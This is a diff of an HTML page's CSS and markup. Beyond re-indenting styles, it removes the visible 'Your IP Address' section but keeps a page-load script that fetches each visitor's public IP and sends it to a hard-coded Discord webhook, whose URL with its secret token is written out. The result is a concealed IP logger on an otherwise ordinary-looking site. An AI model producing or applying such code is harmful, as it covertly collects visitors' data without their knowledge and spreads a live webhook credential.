@@ -20,24 +20,24 @@
             text-align: center;
         }
 
-            header h1 {
-                margin: 0;
-            }
+        header h1 {
+            margin: 0;
+        }
 
         nav ul {
             list-style: none;
             padding: 0;
         }
 
-            nav ul li {
-                display: inline;
-                margin: 0 10px;
-            }
+        nav ul li {
+            display: inline;
+            margin: 0 10px;
+        }
 
-                nav ul li a {
-                    color: white;
-                    text-decoration: none;
-                }
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
 
         main {
             padding: 20px;
@@ -56,13 +56,6 @@
             width: 100%;
             bottom: 0;
         }
-
-        .show_user_ip {
-            background-color: #e2e2e2;
-            padding: 10px;
-            margin-top: 20px;
-            border-radius: 5px;
-        }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
@@ -70,9 +63,6 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const userIpElement = document.getElementById('user-ip');
-                    userIpElement.textContent = data.ip;
-
                     // Send the IP address to the Discord webhook
                     const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
                     const message = {
@@ -127,10 +117,6 @@
         <section id="contact">
             <h2>Contact</h2>
             <p>Get in touch with us through this contact section.</p>
-        </section>
-        <section class="show_user_ip">
-            <h2>Your IP Address</h2>
-            <p>Your IP address is: <span id="user-ip">Fetching...</span></p>
         </section>
     </main>
     <footer>
